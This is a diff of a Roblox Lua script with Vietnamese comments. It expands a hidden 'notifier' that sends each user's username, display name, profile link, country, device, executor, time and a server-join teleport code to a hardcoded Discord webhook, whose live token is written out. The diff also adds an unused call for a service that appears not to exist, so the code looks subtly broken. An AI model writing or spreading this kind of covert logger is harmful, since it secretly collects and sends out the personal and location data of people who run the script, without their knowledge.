@@ -3,6 +3,7 @@ local Players = game:GetService("Players")
 local MarketplaceService = game:GetService("MarketplaceService")
 local TeleportService = game:GetService("TeleportService")
 local UserInputService = game:GetService("UserInputService")
+local DateTime = game:GetService("TimeOfDay")
 
 -- 🔗 Nhập Webhook của bạn
 local LinkWebHook = "https://discord.com/api/webhooks/1343591803101904916/z7lDVIhJDsOMx6JYeGHP039WD9R-RSsV6YMjYUDsES1MRdgDJfLv8bKJ1PQlnw6xk4LS"
@@ -103,13 +104,21 @@ end
 local username = Players.LocalPlayer.Name
 local displayName = Players.LocalPlayer.DisplayName
 
-sendWebhook("Notifer Xem mấy thk skid dùng script",
-    "** Người chơi:** " .. username .. " (Tên giả: " .. displayName .. ")" ..
-    "\n** Game:** " .. gameName ..
-    "\n** Quốc gia:** " .. country ..
-    "\n** Thiết bị:** " .. deviceType ..
-    "\n** Executor:** " .. executor ..
-    "\n** Place ID:** " .. GameID ..
-    "\n** Server ID:** `" .. ServerID .. "`" ..
-    "\n\n** Mã Teleport:** ```lua\n" .. teleportCode .. "\n```"
+-- 🔗 Tạo link đến profile và game
+local profileUrl = "https://www.roblox.com/users/" .. Players.LocalPlayer.UserId .. "/profile"
+local gameUrl = "https://www.roblox.com/games/" .. GameID
+
+-- 🌍 Lấy thời gian và ngày hiện tại
+local currentTime = os.date("%Y-%m-%d | %H:%M:%S")
+
+-- Gửi Webhook với link nhúng và thông tin thời gian
+sendWebhook("Notifier Xem mấy thk skid dùng script",
+    "**Tên thật:** [" .. username .. "](" .. profileUrl .. ")" ..
+    "\n**Tên giả:** [" .. displayName .. "](" .. profileUrl .. ")" ..
+    "\n**Game:** [" .. gameName .. "](" .. gameUrl .. ")" ..
+    "\n**Quốc gia:** " .. country ..
+    "\n**Thiết bị:** " .. deviceType ..
+    "\n**Executor:** " .. executor ..
+    "\n**Thời gian:** " .. currentTime ..
+    "\n\n**Mã Teleport:** ```lua\n" .. teleportCode .. "\n```"
 )
